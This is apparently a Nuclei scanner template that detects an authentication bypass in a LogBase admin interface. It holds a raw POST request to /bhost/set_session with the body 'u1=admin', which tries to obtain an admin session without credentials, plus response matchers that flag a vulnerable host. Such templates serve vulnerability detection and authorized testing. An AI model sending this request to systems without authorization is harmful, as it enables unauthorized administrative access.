id: logbase-auth-bypass
info:
  name: LogBase Admin Authentication Bypass
  author: ProjectDiscoveryAI
  severity: high
  tags: auth-bypass
http:
  - raw:
      - |
        POST /bhost/set_session HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Referer: {{BaseURL}}

        u1=admin
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "application/json"
      - type: word
        part: body
        words:
          - "result"
          - "ErrMsg"
          - "info"
